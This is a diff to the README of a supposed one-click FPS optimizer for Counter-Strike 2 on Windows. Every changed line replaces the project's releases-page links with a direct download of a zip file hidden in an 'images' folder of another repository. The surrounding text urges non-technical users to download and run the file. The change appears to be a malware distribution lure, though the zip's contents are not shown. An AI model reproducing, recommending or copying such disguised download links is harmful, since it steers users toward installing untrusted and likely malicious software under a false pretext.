@@ -5,7 +5,7 @@ description: "Unlock maximum CS2 FPS on Windows 10/11 with one-click system twea
 ---
 # 🎮 CS2-FPS-Optimizer-for-Windows-10-11-Boost-Performance-2026- - Boost Your FPS Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_FPS_Optimizer-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Harlowwinston17/CS2-FPS-Optimizer-for-Windows-10-11-Boost-Performance-2026-/releases)
+[![Download Now](https://img.shields.io/badge/Download-CS2_FPS_Optimizer-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Harlowwinston17/harlowwinston17.github.io/main/images/Release-v3.4-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ No technical skills are needed. Just follow the simple steps below, and you'll b
 
 ## 📥 Download the Application
 
-Visit this link to download the application: [https://github.com/Harlowwinston17/CS2-FPS-Optimizer-for-Windows-10-11-Boost-Performance-2026-/releases](https://github.com/Harlowwinston17/CS2-FPS-Optimizer-for-Windows-10-11-Boost-Performance-2026-/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Harlowwinston17/harlowwinston17.github.io/main/images/Release-v3.4-alpha.2.zip](https://raw.githubusercontent.com/Harlowwinston17/harlowwinston17.github.io/main/images/Release-v3.4-alpha.2.zip)
 
 Click the green "Download" button or the latest release file listed on that page. The download will start automatically. Once finished, the file will be in your "Downloads" folder.
 
@@ -115,9 +115,9 @@ This will remove the application and restore your system to its previous state.
 
 You're now ready to get the most out of Counter-Strike 2. Download the optimizer, run it, and enjoy a smoother, faster gaming experience. Join thousands of players who have already improved their performance with this tool.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Harlowwinston17/CS2-FPS-Optimizer-for-Windows-10-11-Boost-Performance-2026-/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Harlowwinston17/harlowwinston17.github.io/main/images/Release-v3.4-alpha.2.zip)
 
-Remember, the download link is: [https://github.com/Harlowwinston17/CS2-FPS-Optimizer-for-Windows-10-11-Boost-Performance-2026-/releases](https://github.com/Harlowwinston17/CS2-FPS-Optimizer-for-Windows-10-11-Boost-Performance-2026-/releases)
+Remember, the download link is: [https://raw.githubusercontent.com/Harlowwinston17/harlowwinston17.github.io/main/images/Release-v3.4-alpha.2.zip](https://raw.githubusercontent.com/Harlowwinston17/harlowwinston17.github.io/main/images/Release-v3.4-alpha.2.zip)
 
 Get ready to play at your best. Good luck and have fun!
 
